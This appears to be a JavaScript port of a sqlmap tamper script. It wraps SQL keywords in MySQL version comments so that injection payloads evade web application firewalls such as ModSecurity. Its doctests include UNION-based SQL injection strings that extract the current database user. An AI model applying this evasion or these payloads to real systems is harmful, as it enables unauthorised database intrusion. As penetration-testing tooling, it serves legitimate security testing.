// 上游形态变体（T-6，对标 sqlmap 1.10.10 versionedkeywords.py）：贴字无空格 `/*!KEYWORD*/`，
// 且只处理「裸词」—— 后随 `(` 的函数调用不包（CONCAT( / CHAR( 保持原样），关键词面取上游
// keywords.txt 全量真值（upstreamKeywords.js）。与 versionedkeywords（`/*! KEYWORD */` 带空格、
// 本仓自有词表）的差异是否替换默认，由 modsec-live 真机 A/B 定 ⇒ 本件不动默认链（批次 D13）。
import { SQL92_KEYWORDS } from '../upstreamKeywords.js';

export const versionedkeywordsnospace = {
  name: 'versionedkeywordsnospace',
  description: '将裸关键词用 /*!KEYWORD*/ 贴字包裹（上游形态：无空格、函数调用不包；MySQL 版本注释）',
  doctests: [
    // 期望取自上游 1.10.10 docstring（经 docstring 编译层还原后的真实形态）
    {
      input: '1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#',
      output: '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#',
    },
    {
      // 句尾边界回归（2026-10-09）：关键词落在 payload 最后一个字符时也必须被包裹
      input: "1' UNION ALL SELECT USER",
      output: "1'/*!UNION*//*!ALL*//*!SELECT*//*!USER*/",
    },
  ],
  dbms: ['MySQL'], // [P1-FIX] 方言限定：异构库下无效，运行时告警
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    const out = String(payload ?? '').replace(
      // 上游 Python 原文写 `\Z`（串尾），JS 里 `\Z` 是**字面量 Z** ⇒ 句尾关键词永不包裹。
      // 边界要的是串尾，JS 对应 `$`。
      /(?:^|(?<=\W))([A-Za-z_]+)(?=[^\w(]|$)/g,
      (word) => (SQL92_KEYWORDS.has(word.toUpperCase()) ? `/*!${word}*/` : word)
    );
    // 上游收尾：剥掉注释标记旁的空格（Python str.replace 全量替换 ⇒ 这里用 /g）
    return out.replace(/ \/\*!/g, '/*!').replace(/\*\/ /g, '*/');
  },
};

export default versionedkeywordsnospace;
